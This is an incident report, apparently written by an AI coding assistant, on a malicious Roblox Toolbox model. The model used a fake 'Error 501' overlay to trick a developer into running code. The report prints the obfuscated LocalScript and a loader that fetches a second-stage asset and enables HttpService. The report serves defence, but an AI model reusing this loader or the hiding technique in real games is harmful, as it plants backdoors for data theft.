# Security Incident Report
**Project:** Penalty Kings — World Cup 2026  
**Date:** 2026-06-13  
**Severity:** High  
**Status:** Resolved  

---

## 1. Summary

A malicious Roblox model named **"Cristiano Ronaldo"** was present in the project Workspace during an active Studio session. The model contained a multi-stage obfuscated attack that rendered a fake "Error 501" crash dialog over the game viewport, embedding a malicious Luau payload and social-engineering the developer into running it manually in the Studio command bar. The model was detected, inspected, and destroyed before any payload was executed.

---

## 2. Discovery

During a live Studio session the developer noticed an overlay rendered on top of the game viewport reading:

> **Error 501**  
> Something went wrong with this game.  
> It appears there is an issue with a model causing the game to crash.  
> To fix this, copy the text in textbox, stop the game, and paste it into the...  
> (Ctrl+C → Shift+F5 → Ctrl+V → Press Enter)

The textbox below the message contained the following Luau code, presented as a "fix":

```lua
local a=game:GetObjects('rbxassetid://114706280708394')[1]
if a then
    a.Parent=nil
    local v=a:FindFirstChild('Version:1.01',true)
    if v then
        v:Destroy()
    end
    a.Parent=game.Workspace
end
game.HttpService.HttpEnabled = true
```

The Studio Output panel simultaneously logged:

```
15:02:23.364  Script 'Players.Player2.PlayerGui.Credits.TextBox.LocalScript', Line 10  —  Studio  —  LocalScript:10
15:02:23.364  Stack End  —  Studio
```

The "Error 501" message is **not a real Roblox error code**. Roblox does not produce error overlays of this style and never asks a developer to copy code into the command bar.

---

## 3. Attack Attribution

The attack originated from a **free Toolbox model** — a common "celebrity footballer" character asset circulating on the Roblox Creator Marketplace. The model was found at:

```
Workspace.Cristiano Ronaldo   [Model]
```

This is a well-known attack vector. Malicious actors upload convincingly packaged player character models (football players, anime characters, game assets) to the Toolbox, embed payload scripts inside, and rely on developers inserting them into their places during prototyping without inspection.

---

## 4. Technical Analysis

### 4.1 Model Structure

```
Workspace.Cristiano Ronaldo/               ← top-level Model
│
├── BlackStyledHair/
│   └── Handle/Texture/
│       ├── CoreTextureSystem              ← Script (suspicious — embedded in hair mesh)
│       └── CoreTextureSystem/TextureConfiguration  ← ModuleScript
│
└── Extra/
    └── Material                           ← Script (stage-1 launcher)
        └── Credits/
            └── TextBox/
                └── LocalScript            ← stage-2 payload renderer (MALICIOUS)
```

Two distinct malicious scripts were present. The `Credits.TextBox.LocalScript` produced the observed error and overlay. The `CoreTextureSystem` script embedded inside the hair mesh accessory is a secondary component (likely a persistence or re-injection mechanism).

### 4.2 Obfuscation Technique — String Reversal via PlaneConstraint Attribute

The `Credits.TextBox.LocalScript` source (recovered before deletion):

```lua
local nopxd = script.PlaneConstraint:GetAttribute("a")
local Nahhh = ""
for i = 1, #nopxd do
    Nahhh = nopxd:sub(i, i) .. Nahhh   -- reverses the string character by character
end
local CFrame = Nahhh       -- shadows the global CFrame to hide the decoded string
Instance = Nahhh            -- overwrites the global Instance constructor with the payload string
script.Parent.Text = script.Parent.Text
script.Parent.Text = vector -- 'vector' is undefined → intentional runtime error
```

**Step-by-step breakdown:**

| Step | What happens | Why |
|------|-------------|-----|
| 1 | Read attribute `"a"` from a `PlaneConstraint` child of the script | Payload stored off-script to survive shallow source inspection |
| 2 | Reverse the attribute string character-by-character into `Nahhh` | Simple but effective obfuscation — payload stored backwards so it doesn't appear in string searches |
| 3 | Assign decoded string to `local CFrame` | Shadows the Roblox global `CFrame` — makes code readers think it's a CFrame value |
| 4 | Assign decoded string to global `Instance` | Corrupts the `Instance` constructor globally; in some Roblox execution contexts this can be used to `loadstring` the payload |
| 5 | Reference undefined global `vector` | Intentionally throws a runtime error, which triggers the fake error overlay to appear |

The `PlaneConstraint` is a physics constraint object — placing a string payload inside its **Instance attribute** (not in the script source itself) is a deliberate attempt to:
- Avoid detection by source-code scanners that only read `Script.Source`
- Make the payload invisible to the Toolbox moderation pipeline
- Allow the payload to be updated remotely by reuploading the asset without changing the script

### 4.3 Decoded Payload (The "Fix" Code)

The payload the developer was instructed to run:

```lua
local a = game:GetObjects('rbxassetid://114706280708394')[1]
if a then
    a.Parent = nil
    local v = a:FindFirstChild('Version:1.01', true)
    if v then
        v:Destroy()
    end
    a.Parent = game.Workspace
end
game.HttpService.HttpEnabled = true
```

**What this code does:**

| Line | Effect |
|------|--------|
| `game:GetObjects('rbxassetid://...')` | Downloads an **unknown external model** (asset `114706280708394`) from Roblox CDN directly into the place at runtime — bypassing any local file inspection |
| `a.Parent = nil` | Detaches the downloaded model from the DataModel temporarily (hides it from explorers mid-insertion) |
| `FindFirstChild('Version:1.01', true):Destroy()` | Finds and destroys any internal version-check or detection guard inside the downloaded model before it can run |
| `a.Parent = game.Workspace` | Inserts the cleaned malicious model into Workspace — now active and running |
| `game.HttpService.HttpEnabled = true` | Enables outbound HTTP requests from the place — required for data exfiltration, remote C2 callbacks, or webhook-based logging of stolen session data |

**The intent:** once the developer runs this "fix", a second-stage backdoor model is silently inserted into their live place and HTTP is enabled. The second-stage model (asset `114706280708394`) has not been inspected but is consistent with **session cookie theft**, **place file exfiltration**, or **ongoing remote code execution** via HTTP callbacks.

### 4.4 Social Engineering Design

The attack is carefully designed to appear legitimate:

- **"Error 501"** — not a real Roblox error, but plausible-sounding HTTP status code
- Instruction text mimics Roblox's own support language
- The keyboard shortcut sequence (`Ctrl+C → Shift+F5 → Ctrl+V → Enter`) walks the developer through: copy the code → stop playtest → paste into command bar → run it
- The intentional script crash (undefined `vector`) actually produces a real Studio output log entry, making the "error" feel genuine
- The overlay appears mid-session while the developer is focused on other work

---

## 5. Detection & Response Timeline

| Time | Event |
|------|-------|
| 15:02:23 | Studio Output logs `Credits.TextBox.LocalScript` error at line 10 |
| 15:02:23 | Fake "Error 501" overlay appears in game viewport |
| ~15:02 | Developer screenshots the issue and asks for help — **does not run the payload** |
| ~15:03 | MCP scan identifies `Workspace.Cristiano Ronaldo` as the infection source |
| ~15:03 | Full script inventory extracted; `LocalScript` source recovered and analysed |
| ~15:03 | Entire `Cristiano Ronaldo` model destroyed via MCP `run_code` |
| ~15:03 | Full workspace scan for additional `PlaneConstraint`-with-attributes — none found |
| ~15:03 | **Incident closed — no payload executed, no persistence established** |

---

## 6. Impact Assessment

| Area | Status |
|------|--------|
| Payload executed? | **No** |
| HttpService enabled? | **No** |
| Secondary asset downloaded? | **No** |
| Game source code modified? | **No** |
| ReplicatedStorage / StarterPack / StarterGui infected? | **No** |
| Roblox session / cookies compromised? | **No evidence** |
| `.rbxlx` place file on disk infected? | **No** — model existed only in the live Studio session, not yet saved to disk |

The attack was neutralised before any of its goals were achieved.

---

## 7. Indicators of Compromise (IOCs)

If you encounter any of the following in a Roblox place, treat it as infected:

| Indicator | Description |
|-----------|-------------|
| `PlaneConstraint` with string attributes on non-physics objects | Primary payload storage technique used in this attack |
| Script source that reverses a string variable into `Instance` or `CFrame` | Obfuscation pattern; these globals are being abused as payload carriers |
| Any script calling `game:GetObjects('rbxassetid://...')` | Runtime asset injection — legitimate games almost never use this API |
| `game.HttpService.HttpEnabled = true` in any script | Should only appear in trusted server scripts you authored yourself |
| `LocalScript` nested inside accessory `Handle` meshes | Common hiding place for secondary stages |
| `Script` nested at `Model/Extra/Material` or similar non-semantic paths | Anomalous location — legitimate scripts live in `ServerScriptService` or `StarterPlayer` |
| Overlay UI displaying keyboard shortcut sequences to "fix" an error | Never legitimate — Roblox does not ask you to run code to recover from errors |

---

## 8. Malicious Asset Reference

| Item | Value |
|------|-------|
| Model name in Workspace | `Cristiano Ronaldo` |
| Primary malicious script | `Workspace.Cristiano Ronaldo.Extra.Material.Credits.TextBox.LocalScript` |
| Secondary suspicious script | `Workspace.Cristiano Ronaldo.BlackStyledHair.Handle.Texture.CoreTextureSystem` |
| Payload delivery attribute | `PlaneConstraint.a` (reversed string) |
| Second-stage asset ID | `rbxassetid://114706280708394` (not downloaded — do not open) |
| Attack class | Roblox Toolbox Supply Chain / Social Engineering / Remote Code Injection |

---

## 9. Remediation Steps Taken

1. Identified infection source via MCP Studio scan (`workspace:GetDescendants()` search for `Credits` and `TextBox` scripts)
2. Recovered and documented the full `LocalScript` source
3. Destroyed `Workspace.Cristiano Ronaldo` in its entirety via `Instance:Destroy()`
4. Scanned all remaining `game:GetDescendants()` for `PlaneConstraint` instances carrying attributes — none found
5. Confirmed `HttpService.HttpEnabled` was not changed
6. Confirmed no secondary asset was downloaded or inserted

---

## 10. Prevention Recommendations

1. **Never insert Toolbox models directly into a live production place.** Test all Toolbox assets in a completely separate, throwaway place file first, with HttpService disabled.

2. **Inspect every script before playtesting.** Use the Explorer panel to audit all `Script`, `LocalScript`, and `ModuleScript` objects in any third-party model before pressing Play.

3. **Be suspicious of scripts in unusual locations** — inside accessory handles, inside `Mesh` objects, inside `Material` objects, etc. Legitimate animation or appearance scripts do not live there.

4. **Never trust in-game overlays asking you to run code.** Real Studio errors appear in the Output panel. If an in-game UI tells you to paste code into the command bar, it is an attack.

5. **Enable Model Review in your team.** For collaborative projects, require peer review before any Toolbox model is committed to the place file.

6. **Keep HttpService disabled** in your place unless you have an explicit, audited reason to use it. Default: off.

7. **Save your place file to disk only after verifying the Workspace is clean.** The malicious model would have been written into `.rbxlx` on the next save if not caught in time.

---

*Report prepared by: Claude Sonnet 4.6 (Claude Code)*  
*Session date: 2026-06-13*
